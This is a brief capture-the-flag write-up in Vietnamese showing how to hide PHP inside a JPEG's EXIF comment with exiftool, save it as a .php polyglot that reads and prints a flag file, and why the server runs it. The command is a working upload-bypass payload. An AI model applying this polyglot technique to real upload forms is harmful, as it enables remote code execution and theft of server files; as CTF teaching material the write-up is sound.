# Write Up

Lệnh để chèn code php vào ảnh

```bash
exiftool -Comment="<?php echo 'This is the Flag ---> ' . file_get_contents('/path/to/get/flag') . ' <--- This is the Flag'; ?>" cat.jpg -o polyglot.php
```

Lý do chúng ta có thể tạo ra file ảnh và nhét đoạn mã php vào phần comment rồi đổi lại tên file thành php mà file vẫn được thực thi là nhờ PHP không quan tâm file có phải ảnh hay không.

- Khi `Apache/Nginx` đưa file `.php` cho PHP interpreter → PHP sẽ đọc toàn bộ nội dung file từ đầu đến cuối.
- Bất kỳ đoạn nào nằm giữa thẻ `<?php ... ?>` sẽ được thực thi.

👉 Nghĩa là, chỉ cần trong file có chuỗi `<?php ... ?>` ở bất cứ đâu, thì khi server parse file đó như PHP, đoạn code này sẽ được chạy.